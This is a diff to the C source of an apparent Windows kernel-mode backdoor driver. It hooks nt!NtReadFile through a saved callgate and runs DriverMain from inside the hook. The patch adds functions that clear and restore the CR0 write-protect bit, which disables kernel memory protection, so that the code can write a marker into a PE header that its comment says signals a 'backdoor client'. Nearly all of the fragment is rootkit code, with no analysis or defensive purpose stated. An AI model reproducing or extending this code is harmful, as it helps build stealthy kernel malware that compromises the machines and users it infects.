@@ -3,6 +3,10 @@
 // make crt functions inline
 #pragma intrinsic(memcpy)
 
+// write protect bit of CR0 register
+#define CR0_WP 0x00010000
+
+// size of the nt!NtReadFile() call stub
 #define MAX_CALLGATE_LEN 0x40
 
 typedef NTSTATUS (NTAPI * func_NtReadFile)(
@@ -21,6 +25,18 @@ PVOID m_Driver = NULL;
 
 // callgate for original nt!NtReadFile()
 UCHAR old_NtReadFile[MAX_CALLGATE_LEN];
+//--------------------------------------------------------------------------------------
+void wp_disable(void)
+{
+    // disable write protection
+    _cr0_set(_cr0_get() & ~CR0_WP);
+}
+
+void wp_enable(void)
+{
+    // restore write protection
+    _cr0_set(_cr0_get() | CR0_WP);
+}
 //--------------------------------------------------------------------------------------
 NTSTATUS DriverMain(void)
 {
@@ -55,7 +71,12 @@ NTSTATUS NTAPI new_NtReadFile(
             DriverMain();
         }        
 
+        wp_disable();
+
+        // notify backdoor client that DriverMain() was executed
         pHeader->e_res[0] = 0xffff;
+
+        wp_enable();
     }    
 
     // call original function
